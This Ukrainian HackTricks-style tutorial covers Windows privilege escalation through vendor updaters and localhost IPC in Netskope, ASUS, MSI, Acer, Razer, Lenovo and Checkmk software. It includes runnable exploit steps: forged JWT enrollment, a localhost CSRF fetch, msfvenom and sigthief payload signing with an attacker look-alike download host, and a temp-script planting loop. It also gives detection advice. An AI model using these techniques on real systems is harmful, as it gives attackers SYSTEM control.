# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope, ASUS і MSI)

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено клас ланцюжків локального підвищення привілеїв у Windows, виявлених в агентах і програмах оновлення корпоративних кінцевих пристроїв, які надають доступний IPC-інтерфейс і привілейований процес оновлення. Показовий приклад — Netskope Client для Windows версій до R129 (CVE-2025-0309): користувач із низькими привілеями може змусити клієнт пройти реєстрацію на сервері під контролем атакувальника, а потім передати шкідливий MSI, який встановить служба SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна застосувати до подібних продуктів:
- Зловживайте IPC привілейованої служби на localhost, щоб примусово повторно зареєструвати її або переналаштувати на сервер атакувальника.
- Реалізуйте ендпоїнти оновлення виробника, передайте підроблений Trusted Root CA і спрямуйте програму оновлення на шкідливий «підписаний» пакет.
- Обходьте слабкі перевірки підписувача (списки дозволених CN), необов’язкові прапорці дайджесту та поблажливі властивості MSI.
- Якщо IPC «зашифрований», отримайте ключ/IV із загальнодоступних ідентифікаторів комп’ютера, що зберігаються в реєстрі.
- Якщо служба обмежує клієнтів за шляхом до образу/назвою процесу, впровадьте код у процес зі списку дозволених або запустіть такий процес у призупиненому стані й завантажте DLL за допомогою мінімальної зміни контексту потоку.

Під час перевірки спеціальних локальних TCP-служб слід так само досліджувати ідентифікацію та межі обробки вхідних даних, навіть якщо для доступу потрібен PIN-код або інший обліковий запис програми. Визначте, якому процесу відповідає слухач і який обліковий запис служби він фактично використовує, а потім перевірте точну розгорнуту версію бінарного файла та чи перевіряють довжину полів, контрольованих клієнтом, перед копіюванням у буфери фіксованого розміру або використанням для формування команди дочірнього процесу. [Рекомендації Microsoft щодо переповнення буфера](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) пояснюють, чому неперевірені зовнішні дані небезпечні в привілейованому нативному коді. Сам по собі слухач loopback, жорстко задані облікові дані чи назва процесу не доводять наявності пошкодження пам’яті або виконання коду з правами SYSTEM; доступність, авторизація, шлях виконання коду та засоби пом’якшення ризиків є окремими умовами. Під час звичайного переліку дотримуйтеся пасивного режиму й не надсилайте живій службі вхідні дані довжиною, що спричиняє аварійне завершення.

## 1) Примусова реєстрація на сервері атакувальника через localhost IPC

Багато агентів постачаються з UI-процесом у режимі користувача, який обмінюється JSON із службою SYSTEM через localhost TCP.

Виявлено в Netskope:
- UI: stAgentUI (низький рівень цілісності) ↔ Service: stAgentSvc (SYSTEM)
- Команда IPC ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Сценарій експлуатації:
1) Створіть токен реєстрації JWT із claims, які визначають хост бекенда (наприклад, AddonUrl). Використайте alg=None, щоб підпис не був потрібен.
2) Надішліть повідомлення IPC із викликом команди реєстрації та вкажіть свій JWT і назву орендаря:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Служба починає надсилати запити до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка caller ґрунтується на шляху/імені, надсилайте запит від імені allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Мережевий IPC керування

Ця межа довіри не завжди обмежується localhost. У описаному випадку MyReport Updater 2.1.1 служба `LocalSystem` прослуховувала всі інтерфейси та приймала неавтентифіковану зміну конфігурації gRPC для reference host, порту й режиму роботи. Для віддаленого варіанта були потрібні як мережевий доступ до listener, так і вихідний доступ служби до вибраного reference. Оцінюйте ці умови окремо від того, чи може подальший потік пакета перетнути межу запису файлів.<sup>[[16]](#references)</sup>

## 2) Перехоплення каналу оновлення для запуску коду від імені SYSTEM

Коли клієнт починає взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і спрямуйте його на MSI зловмисника. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON-конфігурацію з дуже коротким інтервалом оновлення, наприклад:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Повертає сертифікат CA у форматі PEM. Служба встановлює його в сховище Trusted Root локального комп’ютера.
3) /v2/checkupdate → Надає метадані з посиланням на шкідливий MSI та підробленою версією.

Обхід типових перевірок, які трапляються на практиці:
- Allow-list CN підписувача: служба може лише перевіряти, чи Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати leaf-сертифікат із таким CN і підписати MSI.
- Властивість CERT_DIGEST: додайте до MSI нешкідливу властивість із назвою CERT_DIGEST. Під час встановлення вона не перевіряється.
- Необов’язкова перевірка digest: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

У результаті служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок з обходу виправлень: якщо постачальник у відповідь додає до allow-list невелику кількість «довірених» доменів замість криптографічної автентифікації джерела оновлення, шукайте редиректори або reverse proxy, що належать постачальнику, і через які все ще можна спрямовувати трафік. У випадку Netskope подальші публічні дослідження показали, що allow-list епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксіював вміст Azure App Service, контрольований зловмисником. Вважайте allow-list імен хостів перепоною, а не межею довіри.<sup>[[14]](#references)</sup>

Інший тип збою — **самоузгоджені, але не автентифіковані метадані пакета**. У випадку MyReport контрольоване зловмисником посилання надавало змінений архів, а посередник змінював відповіді з MD5 digest і розміром від постачальника до того, як вони доходили до updater. Зіставлення цих значень перевіряло узгодженість відповідей, а не походження від постачальника; колізія MD5 не була потрібна. Вибір каталогу встановлення самим клієнтом перетворив привілейоване розпакування на межу запису файлів. Отриманий примітив завантаження DLL описано в розділі [перетворення довільного запису файлу на DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

## 3) Підроблення зашифрованих IPC-запитів (якщо підтримується)

Починаючи з R127, Netskope загортав JSON IPC у поле encryptData, схоже на Base64. Зворотний аналіз показав, що використовується AES із ключем/IV, похідними від значень реєстру, доступних для читання будь-якому користувачу:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Зловмисники можуть відтворити шифрування та надсилати коректні зашифровані команди зі звичайного облікового запису користувача.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо агент раптом починає «шифрувати» свій IPC, шукайте в HKLM ідентифікатори пристроїв, GUID продукту та ID встановлення, які можуть використовуватися як матеріал для ключа.

## 4) Обхід allow-list викликів IPC (перевірки шляху/імені)

Деякі служби намагаються автентифікувати peer, визначаючи PID TCP-з’єднання та порівнюючи шлях/ім’я образу з allow-list бінарних файлів постачальника в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні способи обходу:
- Ін’єкція DLL в процес із allow-list (наприклад, nsdiag.exe) і проксіювання IPC із нього.
- Запустіть бінарний файл із allow-list у призупиненому стані та завантажте свою proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити правила захисту драйвера від втручання.<sup>[[1]](#references)[[2]](#references)</sup>

## 5) Ін’єкція з урахуванням захисту від втручання: призупинений процес + патч NtContinue

У продуктах часто є драйвер minifilter/OB callbacks (наприклад, Stadrv), який забирає небезпечні права в дескрипторів захищених процесів:
- Процес: вилучає PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Потік: обмежує права до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode loader, що дотримується цих обмежень:
1) Викличте CreateProcess для бінарного файлу постачальника з прапорцем CREATE_SUSPENDED.
2) Отримайте дескриптори, які вам усе ще доступні: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу та дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви патчите код за відомим RIP).
3) Перезапишіть ntdll!NtContinue (або інший thunk, який гарантовано відображається на ранньому етапі) невеликим stub-кодом, що викликає LoadLibraryW для шляху до вашої DLL, а потім повертається назад.
4) Викличте ResumeThread, щоб запустити ваш stub у процесі та завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви самі його створили), політику драйвера дотримано.<sup>[[1]](#references)[[2]](#references)</sup>

## 6) Практичні інструменти
- NachoVPN (плагін Netskope) автоматизує створення rogue CA, підписання шкідливого MSI та обслуговує потрібні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — це спеціальний IPC-клієнт, який формує довільні (за потреби зашифровані AES) IPC-повідомлення та містить ін’єкцію в призупинений процес, щоб надсилати їх від імені бінарного файлу з allow-list.<sup>[[4]](#references)</sup>

## 7) Швидкий робочий процес первинного аналізу невідомих поверхонь updater/IPC

Якщо ви маєте справу з новим endpoint agent або набором «допоміжних» програм для материнської плати, зазвичай достатньо швидкого робочого процесу, щоб зрозуміти, чи є перед вами перспективна ціль для privesc:<sup>[[6]](#references)</sup>

1) Перелічіть loopback listeners і визначте відповідні процеси постачальника:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Перелічіть потенційні іменовані канали:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Збирайте маршрутизаційні дані з реєстру, які використовують IPC-сервери на основі плагінів:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Спочатку витягніть назви endpoint, ключі JSON і ID команд із клієнта user-mode. Упаковані фронтенди Electron/.NET часто розкривають повну схему:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Варто приділити пріоритетну увагу таким шаблонам:
- `CryptQueryObject`/розбір сертифікатів без `WinVerifyTrust` зазвичай означає, що «сертифікат існує» прирівняли до «сертифікат довірений», що дає змогу клонувати сертифікати або використовувати інші трюки з підробленими підписантами.
- Перевірки підрядка/суфікса для `Origin`, `Referer`, URL завантажень, імен процесів або CN підписанта — це не автентифікація. `contains(".vendor.com")` зазвичай можна використати через контрольовані зловмисником домени-двійники.
- Якщо GUI з низькими привілеями визначає, що «файл довірений», а брокер SYSTEM лише використовує цей результат, патчинг або повторна реалізація клієнтської DLL/JS часто повністю обходить цей бар’єр (розділена перевірка на кшталт Razer).
- Якщо брокер копіює payload у `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє його або планує запуск із цього шляху, відразу перевірте наявність вікон для підміни TOCTOU, а також сусідніх модулів плагінів з альтернативними обгортками `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю іменованих каналів PipeViewer — швидкий спосіб виявити слабкі DACL і канали, доступні віддалено, перш ніж починати детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує клієнтів лише за PID, шляхом до образу або іменем процесу, вважайте це радше перешкодою, ніж бар’єром: часто достатньо впровадити код у легітимний клієнт або встановити з’єднання з процесу зі списку дозволених, щоб пройти перевірки сервера. Для іменованих каналів докладніше про цю техніку розповідає [ця сторінка про імперсонацію клієнта та зловживання каналами](named-pipe-client-impersonation.md).

Для привілейованого **брокера очищення або відновлення** перевірте межу довіри до шляхів, а також ACL каналу. Користувач із нижчими привілеями може мати змогу вибрати місце відновлення або перейменувати підготовлений артефакт резервної копії у спільному каталозі, навіть якщо виконуваний файл служби та її інсталяційний каталог захищені. Окремо підтвердьте, що клієнт може викликати команду відновлення, змінити точний підготовлений вхідний файл або його ім’я, що брокер працює з вищими привілеями і що операція відновлення справді записує дані у вибраний захищений шлях. Доступний для запису каталог підготовки або канал, доступний для читання, самі по собі не доводять можливість довільного привілейованого запису; відповідність шляхів і поведінку служби потрібно перевірити під час аналізу коду або контрольованого тестування. Не запускайте невідому команду очищення під час пасивного переліку: вона може видалити файли користувача.

## 8) Модульні брокери add-in, що автентифікують клієнтів лише за підписами постачальника (шаблон Lenovo Vantage)

Новий варіант, на який варто звернути увагу, — **RPC-брокер із підписаним клієнтом**: настільний процес Lenovo з низькими привілеями спілкується зі службою SYSTEM, а служба спрямовує JSON-команди до набору add-in, описаних у XML, у `%ProgramData%`. Щойно вдається виконати код **у будь-якому прийнятому підписаному клієнті**, кожен контракт `runas="system"` стає частиною поверхні атаки.<sup>[[15]](#references)</sup>

Цінні примітиви, виявлені під час досліджень Lenovo Vantage:
- **Довіра до клієнта через підпис постачальника**: дослідники досягли автентифікованого контексту, скопіювавши підписаний Lenovo EXE у каталог із правом запису й організувавши sideload DLL (`profapi.dll`), щоб довільний код виконався всередині клієнта, якому служба вже довіряла.
- **Виявлення поверхні атаки через маніфести**: add-in оголошені в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів виконуються від імені `SYSTEM`, тому перелік цих маніфестів часто швидше виявляє справжні привілейовані команди, ніж реверс самого брокера.
- **Помилки окремих команд за автентифікованим каналом**: опинившись усередині довіреного клієнта, дослідники виявили обхід шляху + race condition у командах оновлення/інсталяції, зловживання raw SQL у привілейованих базах даних налаштувань і перевірки шляхів реєстру на основі підрядків, які давали змогу записувати дані за межами призначеного hive.

Корисна розвідка цілі:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Практичний висновок: щоразу, коли helper suite надає broker, який спочатку автентифікує **процес-викликач**, а вже потім передає керування десяткам команд plugin/add-in, не зупиняйтеся після обходу початкової перевірки довіри. Вивантажте таблицю manifest/contract і окремо fuzz-те кожну команду з високими привілеями; автентифікований канал зазвичай приховує кілька помилок другого етапу.

## 1) CSRF із браузера до localhost проти привілейованих HTTP API (ASUS DriverHub)

DriverHub постачається з HTTP-службою в user mode (ADU.exe) на 127.0.0.1:53000, яка очікує браузерні запити з https://driverhub.asus.com. Фільтр origin просто виконує `string_contains(".asus.com")` для заголовка Origin і URL-адрес завантаження, доступних через `/asus/v1.0/*`. Тому будь-який контрольований зловмисником хост, як-от `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати запити, що змінюють стан, із JavaScript.<sup>[[6]](#references)</sup> Додаткові способи обходу див. у [основах CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Практичний сценарій:
1) Зареєструйте домен, що містить `.asus.com`, і розмістіть на ньому шкідливу вебсторінку.
2) Використайте `fetch` або XHR, щоб викликати привілейований endpoint (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть JSON body, очікуваний обробником, — упакований frontend JS показує схему нижче.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Навіть наведена нижче команда PowerShell успішно виконується, якщо підробити заголовок Origin, указавши довірене значення:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Будь-який перехід у браузері на сайт атакувальника стає локальним CSRF в 1 клік (або в 0 кліків через `onload`), який запускає helper із правами SYSTEM.

## 2) Небезпечна перевірка підпису коду та клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в JSON body, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка URL завантаження використовує ту саму логіку пошуку підрядка, тому `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, що PE містить підпис і що рядок Subject збігається з ASUS, перш ніж запустити його — без `WinVerifyTrust` і без перевірки ланцюжка сертифікатів.

Щоб перетворити цей потік на експлойт:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підписувача ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на домені-копії `.asus.com` і запустіть UpdateApp через описаний вище browser CSRF.

Оскільки і фільтри Origin та URL шукають лише підрядок, а перевірка підписувача лише порівнює рядки, DriverHub завантажує та виконує бінарний файл атакувальника з підвищеними привілеями.<sup>[[6]](#references)</sup>

## 1) TOCTOU у шляхах копіювання/виконання updater (MSI Center CMD_AutoUpdateSDK)

SYSTEM-сервіс MSI Center надає TCP-протокол, у якому кожен frame має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його обробник:
1) Копіює вказаний виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює scheduled task, який запускає тимчасовий файл від імені SYSTEM з аргументами, контрольованими атакувальником.

Скопійований файл не блокується між перевіркою та `ExecuteTask()`. Атакувальник може:
- Надіслати Frame A із посиланням на легітимний бінарний файл із підписом MSI (це гарантує успішне проходження перевірки підпису та постановку завдання в чергу).
- Змагатися з ним, надсилаючи повторні повідомлення Frame B із посиланням на шкідливий payload, який перезаписує `MSI Center SDK.exe` одразу після завершення перевірки.

Коли спрацює scheduler, він виконає перезаписаний payload від імені SYSTEM, хоча перевірку пройшов оригінальний файл. Для надійного експлойту використовуються дві goroutine/threads, які безперервно надсилають CMD_AutoUpdateSDK, поки не вдасться виграти TOCTOU window.<sup>[[6]](#references)</sup>

## 2) Зловживання власними IPC на рівні SYSTEM та impersonation (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти frame вибирають цей компонент, даючи атакувальникам змогу спрямовувати команди до довільних модулів.
- Plugins можуть визначати власні task runners. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` **без перевірки підпису** — будь-який локальний користувач може вказати на `C:\Users\<user>\Desktop\payload.exe` і гарантовано отримати виконання від імені SYSTEM.
- Перехоплення loopback-трафіку через Wireshark або аналіз .NET-бінарних файлів у dnSpy швидко виявляє відповідність Component ↔ command; після цього власні Go/Python-клієнти можуть повторно надсилати frames.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre та рівні impersonation
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє підключення віддалених клієнтів (наприклад, `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` із шляхом до файла викликає процедуру запуску процесу в сервісі.
- Бібліотека клієнта серіалізує разом з аргументами magic terminator byte (113). Динамічна інструментація за допомогою Frida/`TsDotNetLib` (поради з інструментації див. у [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показує, що native handler перетворює це значення на `SECURITY_IMPERSONATION_LEVEL` та integrity SID перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) спрямовує виконання у generic branch, який зберігає повний SYSTEM token і задає SID високого рівня цілісності (`S-1-16-12288`). Тому запущений бінарний файл працює з необмеженими правами SYSTEM — як локально, так і на іншій машині.
- Поєднайте це з доступним прапорцем інсталятора (`Setup.exe -nocheck`), щоб встановити ACC навіть на лабораторних VM і перевірити роботу pipe без обладнання виробника.<sup>[[6]](#references)</sup>

Ці помилки IPC показують, чому localhost-сервіси мають забезпечувати взаємну автентифікацію (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, фільтрація token) і чому helper для «запуску довільного бінарного файла» в кожному модулі має використовувати ті самі перевірки підпису.

## 3) COM/IPC helpers-«elevator» зі слабкою user-mode перевіркою (Razer Synapse 4)

У Razer Synapse 4 з’явився ще один показовий приклад цього типу: користувач із низькими привілеями може попросити COM helper запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делегується user-mode DLL (`simple_service.dll`), а не надійно забезпечується всередині привілейованого середовища.

Виявлений шлях експлуатації:
- Створити екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викликати `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити запуск із підвищеними привілеями.
- У публічному PoC перевірку PE-підпису в `simple_service.dll` вимкнено патчем перед надсиланням запиту, що дозволяє запустити довільний виконуваний файл, вибраний атакувальником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Загальний висновок: під час реверсингу «допоміжних» пакетів не обмежуйтеся TCP на localhost або іменованими каналами. Перевіряйте наявність COM-класів із назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з’ясовуйте, чи привілейована служба сама перевіряє цільовий бінарний файл, чи лише довіряє результату, обчисленому патчуваною DLL клієнта в user mode. Цей шаблон застосовується не лише до Razer: будь-яка розділена архітектура, у якій брокер із високими привілеями отримує рішення «дозволити/заборонити» від сторони з низькими привілеями, може стати поверхнею для privesc.

## Виконання передбачуваного тимчасового скрипту під час відновлення MSI (Checkmk Agent / CVE-2024-0670)

Деякі агенти Windows досі реалізують привілейовані дії, записуючи тимчасовий файл `.cmd` у `C:\Windows\Temp` і запускаючи його від імені `SYSTEM`. Якщо ім’я файлу передбачуване, а служба не забезпечує безпечне повторне створення наявних файлів, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл із атрибутом **лише для читання** та змусити привілейований процес виконати контрольований зловмисником вміст замість власного скрипту.

Виявлено у вразливих збірках Checkmk Agent:
- шаблон тимчасового файлу: `cmk_all_<PID>_1.cmd`
- уражені гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: **відновлення** MSI кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний алгоритм:
1. Оцініть реалістичний діапазон PID за поточними ідентифікаторами процесів або PID запущеного агента.
2. Запишіть короткий **ASCII**-файл із payload `.cmd` (`Set-Content -Encoding Ascii` або перенаправлення в `cmd.exe`; уникайте виводу PowerShell у UTF-16 для batch-файлів).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` для всього діапазону кандидатів і позначте кожен файл як доступний лише для читання.
4. Запустіть відновлення кешованого MSI, щоб привілейована служба спробувала повторно створити тимчасовий скрипт і виконати його.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте кешований MSI зі схожою на випадкову назвою в `C:\Windows\Installer` з назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Операційні примітки:
- `qwinsta` корисна, коли `msiexec /fa` завершується помилкою з неінтерактивної WinRM-оболонки й потрібно з’ясувати, чи може наявний сеанс робочого столу або від’єднаний сеанс належним чином запустити відновлення.<sup>[[7]](#references)</sup>
- Цей шаблон поширюється й на інші агенти кінцевих точок та засоби оновлення, які **розміщують тимчасові скрипти в доступних для запису всім місцях, а згодом запускають їх із правами SYSTEM**. Перевіряйте передбачувані імена, відсутність семантики ексклюзивного створення та сценарії відновлення/оновлення, які можна запускати на вимогу.

### Відновлення інтерактивного інсталятора та привілейована консоль

PDF24 Creator 11.15.1 демонструє окремий ризик відновлення MSI: під час відновлення спеціальна дія встановлення принтера може запустити видиму консоль із правами SYSTEM. Постачальник змінив MSI-інсталятор у версії 11.15.2, щоб усунути цю поведінку. Стара версія продукту — лише підказка для первинного аналізу. Перевірте зареєстрований або доступний пакет MSI, чи може цей користувач ініціювати відновлення, чи присутні вразлива спеціальна дія та затримка створення файлу журналу, а також чи може інтерактивний робочий стіл показати консоль. Для створення затримки, про яку повідомлялося, використовувався oplock на `faxPrnInst.log`; звичайного доступу до файлу на запис недостатньо. Неінтерактивна оболонка, недоступний пакет або виправлений інсталятор можуть перервати цей ланцюжок. Ця проблема не залежить від `AlwaysInstallElevated` і відрізняється від підміни передбачуваного тимчасового скрипту.

## Віддалене захоплення ланцюжка постачання через слабку перевірку засобу оновлення (WinGUp / Notepad++)

У період із червня до грудня 2025 року зловмисники, які скомпрометували інфраструктуру хостингу, що забезпечувала процес оновлення Notepad++, вибірково надсилали шкідливі маніфести певним жертвам. Старі засоби оновлення на основі WinGUp не повністю перевіряли автентичність оновлень, тому підроблена XML-відповідь могла перенаправити клієнтів на URL-адреси, контрольовані зловмисниками. Оскільки клієнт приймав вміст HTTPS, не перевіряючи належним чином і довірений ланцюжок сертифікатів, і дійсний PE-підпис завантаженого інсталятора, жертви завантажували та запускали троянізований NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний ланцюжок (локальний експлойт не потрібен):
1. **Перехоплення інфраструктури**: скомпрометувати CDN/хостинг і відповідати на запити оновлення метаданими зловмисника, що вказують на шкідливу URL-адресу завантаження.
2. **Троянізований NSIS**: інсталятор завантажує/запускає payload і використовує два ланцюжки виконання:
   - **Bring-your-own signed binary + sideload**: додати підписаний файл Bitdefender `BluetoothService.exe` і розмістити шкідливий `log.dll` у шляху пошуку. Коли запускається підписаний файл, Windows виконує sideload `log.dll`, яка розшифровує та рефлексивно завантажує бекдор Chrysalis (захищений Warbird + хешування API для ускладнення статичного виявлення).
   - **Scripted shellcode injection**: NSIS запускає скомпільований скрипт Lua, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для ін’єкції shellcode та розміщення Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Рекомендації щодо посилення захисту/виявлення для будь-якого засобу автоматичного оновлення:
- Забезпечте **перевірку сертифіката та підпису** завантаженого інсталятора (закріпіть сертифікат підписувача постачальника, відхиляйте невідповідні CN/ланцюжки) і підписуйте сам маніфест оновлення (наприклад, за допомогою XMLDSig). Блокуйте перенаправлення, задані в маніфесті, якщо їх не перевірено.
- Розглядайте **BYO signed binary sideloading** як напрямок виявлення після завантаження: сповіщайте, коли підписаний EXE постачальника завантажує DLL з іменем, розміщену поза стандартним шляхом встановлення (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли засіб оновлення розміщує/запускає інсталятори з тимчасової теки, які не мають підписів постачальника.
- Відстежуйте **артефакти, специфічні для шкідливого ПЗ**, виявлені в цьому ланцюжку (корисні як загальні напрямки пошуку): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%` і етапи ін’єкції shellcode, ініційовані Lua.
- Notepad++ посилив захист WinGUp у версії v8.8.9 та новіших: тепер отриманий XML підписується (XMLDSig), а новіші збірки вимагають перевірки сертифіката та підпису завантаженого інсталятора замість того, щоб довіряти лише каналу передавання.<sup>[[13]](#references)</sup>

### Конфігурація сповіщень як другий тригер оновлення

